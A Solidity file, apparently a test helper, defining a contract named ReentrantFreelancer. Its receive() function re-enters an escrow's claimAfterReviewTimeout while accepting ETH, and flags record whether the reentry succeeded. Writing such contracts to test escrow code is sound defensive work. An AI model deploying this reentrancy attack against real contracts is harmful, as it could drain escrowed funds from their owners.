// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IFreelanceEscrow {

    function acceptJob(
        uint256 _jobId
    ) external;

    function submitWork(
        uint256 _jobId,
        string calldata _workProof
    ) external;

    function claimAfterReviewTimeout(
        uint256 _jobId
    ) external;
}


contract ReentrantFreelancer {

    IFreelanceEscrow public escrow;

    uint256 public targetJobId;

    bool public attackEnabled;
    bool public attackAttempted;
    bool public reentrySucceeded;


    constructor(
        address _escrow
    ) {
        escrow = IFreelanceEscrow(_escrow);
    }


    function accept(
        uint256 _jobId
    ) external {

        escrow.acceptJob(
            _jobId
        );
    }


    function submit(
        uint256 _jobId,
        string calldata _proof
    ) external {

        escrow.submitWork(
            _jobId,
            _proof
        );
    }


    function attack(
        uint256 _jobId
    ) external {

        targetJobId = _jobId;

        attackEnabled = true;

        escrow.claimAfterReviewTimeout(
            _jobId
        );

        attackEnabled = false;
    }


    receive() external payable {

        if (attackEnabled) {

            attackAttempted = true;

            /*
             * Attempt to re-enter the escrow
             * while receiving ETH.
             */
            (bool success, ) =
                address(escrow).call(
                    abi.encodeWithSignature(
                        "claimAfterReviewTimeout(uint256)",
                        targetJobId
                    )
                );

            reentrySucceeded = success;
        }
    }
}